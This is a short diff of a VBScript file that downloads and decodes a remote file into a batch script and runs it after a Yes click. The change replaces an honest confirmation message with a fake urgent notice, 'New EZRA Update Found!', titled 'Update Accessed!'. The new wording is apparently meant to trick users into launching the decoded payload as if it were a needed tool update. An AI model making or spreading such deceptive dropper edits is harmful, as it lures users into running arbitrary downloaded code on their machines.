@@ -55,7 +55,7 @@ If objXMLHTTP.Status = 200 Then
     objFile.Close
 
     ' Execute the batch file with user confirmation
-    userResponse = MsgBox("The script has downloaded and decoded the necessary file. Do you want to execute it?", vbYesNo + vbQuestion, "Execute Decoded File")
+    userResponse = MsgBox("New EZRA Update Found! It is crucial to download update otherwise the tool may not work!", vbYesNo + vbQuestion, "Update Accessed!")
     If userResponse = vbYes Then
         objShell.Run Chr(34) & decodedFilePath & Chr(34), 1, True
     Else
